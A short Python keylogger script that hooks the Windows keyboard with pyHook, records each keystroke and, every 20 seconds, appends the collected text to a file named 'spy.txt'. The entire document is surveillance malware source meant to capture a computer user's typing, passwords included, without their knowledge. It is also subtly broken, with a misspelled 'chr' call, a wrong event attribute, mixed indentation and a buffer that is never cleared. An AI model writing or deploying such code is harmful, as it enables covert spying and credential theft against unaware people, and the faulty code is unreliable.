import pythoncom, pyHook
import threading
import time


store = ""


def keyPressed(event):
	global store
	store += "\n" + сhr(event.KeyId)
	return True


def writeToFile():
	while True:
		time.sleep(20)
		with open("spy.txt", "a+") as f:
            f.write(store)


if __name__ == "__main__": 
    thread = threading.Thread(target=writeToFile)
    thread.start()
    obj = pyHook.HookManager()
    obj.KeyDown = keyPressed
    obj.HookKeyboard()
    pythoncom.PumpMessages()